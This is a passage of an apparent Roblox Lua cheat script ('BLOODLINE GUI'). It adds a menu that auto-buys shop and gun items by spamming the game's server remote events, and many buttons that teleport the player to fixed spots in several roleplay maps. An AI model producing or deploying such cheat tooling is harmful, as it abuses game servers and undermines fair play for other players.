print("Access granted for UserId " .. userId)

--// GUI Setup
local gui = Instance.new("ScreenGui")
gui.Name = ""
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Position = UDim2.new(0.5, -150, 0.5, -200)
frame.Size = UDim2.new(0, 300, 0, 400) 
frame.BackgroundColor3 = Color3.fromRGB(255,255,255)
frame.BorderSizePixel = 1
frame.BorderColor3 = Color3.fromRGB(40, 40, 40)
frame.Parent = gui
frame.Active = true
frame.Draggable = true

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 10)
corner.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 40)
title.BackgroundColor3 = Color3.fromRGB(255,255,255)
title.Text = "BLOODLINE GUI"
title.TextColor3 = Color3.new(0,0,0)
title.Font = Enum.Font.Roboto
title.TextSize = 16
title.Parent = frame

Instance.new("UICorner", title).CornerRadius = UDim.new(0, 8)

local shop1Items = {
    {"Phone", "Phone"},
    {"Cola", "Cola"},
    {"Doritos", "Doritos"}
}

local shop2Items = {
    {"Silenced Pistol", "Silenced Pistol"},
    {"Radio", "Radio"}
}

local selectedShop1 = nil
local selectedShop2 = nil

local itemHeight = 28
local dropdownHeight1 = #shop1Items * itemHeight
local dropdownHeight2 = #shop2Items * itemHeight

--// 7/11 Dropdown
local label1 = Instance.new("TextLabel")
label1.Size = UDim2.new(1, -20, 0, 30)
label1.Position = UDim2.new(0, 10, 0, 50)
label1.Text = "7/11 Shop"
label1.BackgroundTransparency = 1
label1.TextColor3 = Color3.new(0,0,0)
label1.Font = Enum.Font.Roboto
label1.TextSize = 14
label1.Parent = frame

local dropdown1 = Instance.new("TextButton")
dropdown1.Size = UDim2.new(1, -20, 0, 30)
dropdown1.Position = UDim2.new(0, 10, 0, 80)
dropdown1.Text = "Select 7/11 Item"
dropdown1.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdown1.TextColor3 = Color3.new(0,0,0)
dropdown1.Font = Enum.Font.Roboto
dropdown1.TextSize = 14
dropdown1.Parent = frame
Instance.new("UICorner", dropdown1).CornerRadius = UDim.new(0, 6)

local dropdownFrame1 = Instance.new("Frame")
dropdownFrame1.Size = UDim2.new(1, -20, 0, dropdownHeight1)
dropdownFrame1.Position = UDim2.new(0, 10, 0, 115)
dropdownFrame1.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdownFrame1.Visible = false
dropdownFrame1.Parent = frame
Instance.new("UICorner", dropdownFrame1).CornerRadius = UDim.new(0, 5)

for i, item in ipairs(shop1Items) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, itemHeight)
    btn.Position = UDim2.new(0, 0, 0, (i-1)*itemHeight)
    btn.Text = item[1]
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Roboto
    btn.TextSize = 12
    btn.Parent = dropdownFrame1
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)
    btn.MouseButton1Click:Connect(function()
        selectedShop1 = item[2]
        dropdown1.Text = item[1]
        dropdownFrame1.Visible = false
    end)
end

dropdown1.MouseButton1Click:Connect(function()
    dropdownFrame1.Visible = not dropdownFrame1.Visible
end)

--// Gun Shop Dropdown
local label2 = Instance.new("TextLabel")
label2.Size = UDim2.new(1, -20, 0, 30)
label2.Position = UDim2.new(0, 10, 0, 130 + dropdownHeight1)
label2.Text = "Gun Shop"
label2.BackgroundTransparency = 1
label2.TextColor3 = Color3.new(0,0,0)
label2.Font = Enum.Font.Roboto
label2.TextSize = 14
label2.Parent = frame

local dropdown2 = Instance.new("TextButton")
dropdown2.Size = UDim2.new(1, -20, 0, 30)
dropdown2.Position = UDim2.new(0, 10, 0, 160 + dropdownHeight1)
dropdown2.Text = "Select Gun Item"
dropdown2.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdown2.TextColor3 = Color3.new(0,0,0)
dropdown2.Font = Enum.Font.Roboto
dropdown2.TextSize = 14
dropdown2.Parent = frame
Instance.new("UICorner", dropdown2).CornerRadius = UDim.new(0, 6)

local dropdownFrame2 = Instance.new("Frame")
dropdownFrame2.Size = UDim2.new(1, -20, 0, dropdownHeight2)
dropdownFrame2.Position = UDim2.new(0, 10, 0, 195 + dropdownHeight1)
dropdownFrame2.BackgroundColor3 = Color3.fromRGB(255,255,255)
dropdownFrame2.Visible = false
dropdownFrame2.Parent = frame
Instance.new("UICorner", dropdownFrame2).CornerRadius = UDim.new(0, 5)

for i, item in ipairs(shop2Items) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, 0, 0, itemHeight)
    btn.Position = UDim2.new(0, 0, 0, (i-1)*itemHeight)
    btn.Text = item[1]
    btn.BackgroundColor3 = Color3.fromRGB(255,255,255)
    btn.TextColor3 = Color3.new(0,0,0)
    btn.Font = Enum.Font.Roboto
    btn.TextSize = 12
    btn.Parent = dropdownFrame2
    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 5)
    btn.MouseButton1Click:Connect(function()
        selectedShop2 = item[2]
        dropdown2.Text = item[1]
        dropdownFrame2.Visible = false
    end)
end

dropdown2.MouseButton1Click:Connect(function()
    dropdownFrame2.Visible = not dropdownFrame2.Visible
end)

--// Auto Buy Buttons (Pure White)
local toggle1 = Instance.new("TextButton")
toggle1.Size = UDim2.new(1, -20, 0, 35)
toggle1.Position = UDim2.new(0, 10, 0, 210 + dropdownHeight1 + dropdownHeight2)
toggle1.Text = "Start 7/11 Auto Buy"
toggle1.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggle1.TextColor3 = Color3.new(0,0,0)
toggle1.Font = Enum.Font.Roboto
toggle1.TextSize = 14
toggle1.Parent = frame
Instance.new("UICorner", toggle1).CornerRadius = UDim.new(0, 6)

local toggle2 = Instance.new("TextButton")
toggle2.Size = UDim2.new(1, -20, 0, 35)
toggle2.Position = UDim2.new(0, 10, 0, 255 + dropdownHeight1 + dropdownHeight2)
toggle2.Text = "Start Gun Auto Buy"
toggle2.BackgroundColor3 = Color3.fromRGB(255,255,255)
toggle2.TextColor3 = Color3.new(0,0,0)
toggle2.Font = Enum.Font.Roboto
toggle2.TextSize = 14
toggle2.Parent = frame
Instance.new("UICorner", toggle2).CornerRadius = UDim.new(0, 6)

-- Auto adjust frame height
local totalHeight = 300 + dropdownHeight1 + dropdownHeight2
frame.Size = UDim2.new(0, 300, 0, totalHeight)

--// Auto Buy Logic
local isAuto1 = false
local isAuto2 = false

toggle1.MouseButton1Click:Connect(function()
    isAuto1 = not isAuto1
    toggle1.Text = isAuto1 and "Stop 7/11 Auto Buy" or "Start 7/11 Auto Buy"
    
    task.spawn(function()
        while isAuto1 do
            if selectedShop1 then
                local args = {selectedShop1}
                game:GetService("ReplicatedStorage"):WaitForChild("ShopEvent", 9e9):WaitForChild("7/11Events", 9e9):FireServer(unpack(args))
                print("Auto-buying 7/11: " .. selectedShop1)
            end
            task.wait(5)
        end
    end)
end)

toggle2.MouseButton1Click:Connect(function()
    isAuto2 = not isAuto2
    toggle2.Text = isAuto2 and "Stop Gun Auto Buy" or "Start Gun Auto Buy"
    
    task.spawn(function()
        while isAuto2 do
            if selectedShop2 then
                local args = {selectedShop2}
                game:GetService("ReplicatedStorage"):WaitForChild("ShopEvent", 9e9):WaitForChild("GunShopEvent", 9e9):FireServer(unpack(args))
                print("Auto-buying Gun: " .. selectedShop2)
            end
            task.wait(0.001)
        end
    end)
end)

--// RightShift to toggle GUI
UIS.InputBegan:Connect(function(input, gpe)
    if not gpe and input.KeyCode == Enum.KeyCode.RightShift then
        gui.Enabled = not gui.Enabled
    end
end)
end)

local function addMainMenuButton(text, callback)
	local panel = allTabPanels["RP TELEPORT"]
	if not panel then return end
	local btn = new("TextButton", {
		Size = UDim2.new(1, -16, 0, 38),
		BackgroundColor3 = Color3.fromRGB(245,245,245),
		TextColor3 = Color3.new(0,0,0),
		Font = Enum.Font.Roboto,
		TextSize = 14,
		Text = text,
		AutoButtonColor = false,
		Parent = panel,
	})
	new("UICorner", {CornerRadius = UDim.new(0,6), Parent = btn})

	btn.MouseEnter:Connect(function()
		local t = getThemeColors()
		local accent = t.accent or Color3.new(1,1,1)
		local hover = t.bg:Lerp(accent, 0.50)
		TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = hover}):Play()
	end)
	btn.MouseLeave:Connect(function()
		local t = getThemeColors()
		local accent = t.accent or Color3.new(1,1,1)
		local base = t.bg:Lerp(accent, 0.32)
		TweenService:Create(btn, TweenInfo.new(0.15), {BackgroundColor3 = base}):Play()
	end)

	btn.MouseButton1Click:Connect(function()
		clickSound:Play()
		callback()
	end)
end

--// 8 Buttons in Main Menu
addMainMenuButton("-----------------------------THE BILLIONAIRE CITY-----------------------------", function()

end)

addMainMenuButton("HOSPITAL (TBC)", function()
	local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local targetPosition = Vector3.new(-171.21885681152344, 3.0921545028686523, -80.4614028930664)

local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))
    else
        print("Error: HumanoidRootPart missing.")
    end
end

teleportToTarget()
end)

addMainMenuButton("WEST BARRIO BASE (TBC)", function()
	local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local targetPosition = Vector3.new(-1251.2750244140625, 48.51205062866211, 49.710609436035156)

local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))
    else
        print("Error: HumanoidRootPart missing.")
    end
end

teleportToTarget()
end)

addMainMenuButton("CLOTHING (TBC)", function()
	local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local targetPosition = Vector3.new(136.63233947753906, 3.637805938720703, -532.1862182617188)

local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))
    else
        print("Error: HumanoidRootPart missing.")
    end
end

teleportToTarget()
end)

addMainMenuButton("GUNSHOP (TBC)", function()
	local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local targetPosition = Vector3.new(1039.8973388671875, 6.0305328369140625, 76.194091796875)

local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))
    else
        print("Error: HumanoidRootPart missing.")
    end
end

teleportToTarget()
end)

addMainMenuButton("FLEECA BANK (TBC)", function()
	local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local targetPosition = Vector3.new(767.2047119140625, 4.561151027679443, -114.1823959350586)

local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))
    else
        print("Error: HumanoidRootPart missing.")
    end
end

teleportToTarget()
end)

addMainMenuButton("POLICE DEPARTMENT (TBC)", function()
	local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local targetPosition = Vector3.new(518.1054077148438, 11.385021209716797, -561.5379028320312)

local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))
    else
        print("Error: HumanoidRootPart missing.")
    end
end

teleportToTarget()
end)

addMainMenuButton("PHARMACY (TBC)", function()
	local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local targetPosition = Vector3.new(605.3427124023438, 5.316493988037109, 657.0101318359375)

local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))
    else
        print("Error: HumanoidRootPart missing.")
    end
end

teleportToTarget()
end)

addMainMenuButton("PINK CAGE STORAGE (TBC)", function()
	local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local targetPosition = Vector3.new(-886.4883422851562, 28.266876220703125, 243.52357482910156)

local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))
    else
        print("Error: HumanoidRootPart missing.")
    end
end

teleportToTarget()
end)

addMainMenuButton("BEACH TAMBAYAN (TBC)", function()
	local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local targetPosition = Vector3.new(57.73588943481445, -2.0903372764587402, -911.0687255859375)

local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))
    else
        print("Error: HumanoidRootPart missing.")
    end
end

teleportToTarget()
end)

addMainMenuButton("CAR DEALER (TBC)", function()
	local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local targetPosition = Vector3.new(1042.940673828125, 4.098812103271484, 315.0807189941406)

local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))
    else
        print("Error: HumanoidRootPart missing.")
    end
end

teleportToTarget()
end)

addMainMenuButton("ATM BANK (TBC)", function()
	local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local targetPosition = Vector3.new(1072.812744140625, 6.0305328369140625, 66.12694549560547)

local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))
    else
        print("Error: HumanoidRootPart missing.")
    end
end

teleportToTarget()
end)

addMainMenuButton("LIMEYS (TBC)", function()
	local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local targetPosition = Vector3.new(79.9945068359375, 4.025745391845703, -357.07452392578125)

local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))
    else
        print("Error: HumanoidRootPart missing.")
    end
end

teleportToTarget()
end)

addMainMenuButton("SPOT FARM (TBC)", function()
	local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local targetPosition = Vector3.new(739.0060424804688, 3.1494956016540527, 1130.69970703125)

local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))
    else
        print("Error: HumanoidRootPart missing.")
    end
end

teleportToTarget()
end)

addMainMenuButton("FISHING FARM (TBC)", function()
	local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local targetPosition = Vector3.new(-380.8211669921875, 1.1302049160003662, -1418.327880859375)

local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))
    else
        print("Error: HumanoidRootPart missing.")
    end
end

teleportToTarget()
end)

addMainMenuButton("TRAPHOUSE MAIN TRIGGER (TBC)", function()
	local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local targetPosition = Vector3.new(827.1415405273438, 34.8258056640625, -2407.6201171875)

local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))
    else
        print("Error: HumanoidRootPart missing.")
    end
end

teleportToTarget()
end)

addMainMenuButton("TRAPHOUSE SPOT 1 (TBC)", function()
	local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

local targetPosition = Vector3.new(898.70947265625, 57.99732971191406, -2412.48193359375)

local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))
    else
        print("Error: HumanoidRootPart missing.")
    end
end

teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("-----------------------------DOMINION-----------------------------", function()

end)

--// 8 Buttons in Main Menu
addMainMenuButton("HOSPITAL [DOMINION]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-1277.2003173828125, 3.3827743530273438, -1826.16162109375)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("GARAGE [DOMINION]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-790.076416015625, 3.355360984802246, 544.596923828125)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("CLOTHING [DOMINION]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-662.8965454101562, 3.3553061485290527, -1483.33349609375)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("GUNSHOP [DOMINION]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-428.618896484375, 6.015244483947754, -689.5989379882812)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("CAR DEALER [DOMINION]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-275.1256103515625, 3.2432126998901367, -690.48095703125)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("PHARMACY [DOMINION]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-916.824951171875, 3.3557791709899902, -2051.001708984375)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("FLEECA [DOMINION]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-921.0623779296875, 3.446157932281494, -168.2418212890625)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("POLICE DEPARTMENT [DOMINION]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-1821.7645263671875, 13.095586776733398, 286.4205627441406)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("7 ELEVEN [DOMINION]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-497.5661315917969, 3.3553056716918945, -1345.2403564453125)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("TRAPHOUSE MAIN DOOR [DOMINION]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-387.3024597167969, 44.56536102294922, 1706.3074951171875)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("TRAPHOUSE 1ST POINT [DOMINION]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-273.4755554199219, 44.55963134765625, 1818.7889404296875)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("TRAPHOUSE 2ND POINT [DOMINION]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(-495.6800231933594, 44.55963134765625, 1875.9793701171875)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("-----------------------------KALYE ONSE-----------------------------", function()

end)

--// 8 Buttons in Main Menu
addMainMenuButton("HOSPITAL [KALYE ONSE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(1428.125732421875, 40.41292190551758, -32.600135803222656)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("GARAGE [KALYE ONSE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(1444.3717041015625, 40.38081741333008, 272.0224304199219)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("GUNSHOP [KALYE ONSE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(1259.54150390625, 40.65171432495117, 167.2851104736328)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("CLOTHING [KALYE ONSE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(1127.585693359375, 40.649776458740234, -145.60560607910156)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("POLICE DEPARTMENT [KALYE ONSE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(1040.086669921875, 43.81657791137695, -441.8215637207031)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("JOB BOX [KALYE ONSE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(943.53857421875, 40.49576187133789, -20.645029067993164)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("COURT [KALYE ONSE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(1110.2763671875, 40.592098236083984, 100.20720672607422)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

-- Teleport as soon as the character is fully loaded
teleportToTarget()
end)

--// 8 Buttons in Main Menu
addMainMenuButton("SCHOOL [KALYE ONSE]", function()
    -- LocalScript (Client-Side)

local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()

-- Define the target position
local targetPosition = Vector3.new(1418.09277, 60.8931389, 118.621124, 0.0218539275, 5.62096893e-08, 0.999761164, 9.110245e-09, 1, -5.64222589e-08, -0.999761164, 1.03411173e-08, 0.0218539275)

-- Function to teleport the player immediately
local function teleportToTarget()
    -- Check if HumanoidRootPart exists and teleport immediately
    if character and character:FindFirstChild("HumanoidRootPart") then
        character:SetPrimaryPartCFrame(CFrame.new(targetPosition))  -- Teleport to target position
    else
        print("Error: HumanoidRootPart missing.")
    end
end

